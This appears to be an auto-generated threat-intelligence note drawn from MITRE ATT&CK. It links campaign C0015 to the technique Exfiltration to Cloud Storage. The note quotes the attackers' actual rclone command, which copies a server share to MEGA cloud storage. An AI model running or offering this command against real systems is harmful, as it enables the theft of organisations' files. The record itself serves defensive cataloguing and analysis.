---
type: "ATT&CK Relationship"
source: "MITRE ATT&CK Enterprise STIX"
relationship: "uses"
source_object: "C0015"
target_object: "T1567.002"
stix_relationship_id: "relationship--3d4490e3-d3fe-4c2e-8c41-69ebbf8d060e"
---
# Relationship 3829: C0015 — uses → T1567.002

**Source object:** [[01 ATT&CK/C0015 - C0015|C0015: C0015]]  
**Relationship:** `uses`  
**Target object:** [[01 ATT&CK/T1567.002 - Exfiltration to Cloud Storage|T1567.002: Exfiltration to Cloud Storage]]

## Meaning for defensive analysis

Connects a behavior, group, campaign, or software object to something it uses. This is a catalog relationship, not proof of current activity.

## Source description

During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the [Rclone](https://attack.mitre.org/software/S1040) command `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.(Citation: DFIR Conti Bazar Nov 2021)

## How an AI should use this fact

Retrieve this edge together with both linked records. Preserve its direction and relationship label, cite the source object identifiers, and avoid upgrading a catalog association into an incident claim. For operational recommendations, inspect the linked records and corroborate against current telemetry and authoritative product guidance.

## Provenance

[MITRE ATT&CK STIX Enterprise dataset](https://github.com/mitre/cti/tree/master/enterprise-attack), snapshot downloaded 2026-09-30. STIX relationship ID: `relationship--3d4490e3-d3fe-4c2e-8c41-69ebbf8d060e`.
